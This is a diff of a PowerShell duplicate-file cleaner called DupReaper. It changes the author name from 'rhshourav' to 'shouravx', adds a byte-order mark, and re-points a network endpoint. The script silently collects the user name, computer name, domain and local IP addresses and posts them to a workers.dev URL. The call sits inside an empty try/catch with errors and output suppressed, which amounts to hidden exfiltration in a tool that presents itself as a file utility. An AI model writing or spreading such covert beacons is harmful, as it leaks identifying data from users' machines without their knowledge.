@@ -1,4 +1,4 @@
-#Requires -Version 5.1
+﻿#Requires -Version 5.1
 <#
 .SYNOPSIS
     DupReaper v1.7.6 - Folder-aware duplicate file detector and cleaner.
@@ -7,7 +7,7 @@
     Can limit detection and cleanup to a specific folder subtree.
     Supports preset extension groups, separate scan reports, SMB-safe logging, and safe cleanup actions.
 .AUTHOR
-    rhshourav
+    shouravx
 #>
 
 [CmdletBinding()]
@@ -23,7 +23,7 @@ $WarningPreference     = 'SilentlyContinue'
 # ======================================================================
 
 $Script:VER     = '1.7.6'
-$Script:AUTHOR  = 'rhshourav'
+$Script:AUTHOR  = 'shouravx'
 $Script:W       = 78
 $Script:MINSIZE = 0
 
@@ -239,7 +239,7 @@ try {
         text  = "DupReaper v$($Script:VER)`nUser: $env:USERNAME  PC: $env:COMPUTERNAME  Domain: $env:USERDOMAIN  IP: $($localIPs -join ', ')"
     } | ConvertTo-Json)
 
-    Invoke-RestMethod -Uri 'https://cryocore.rhshourav.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
+    Invoke-RestMethod -Uri 'https://cryocore.shouravx.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
 
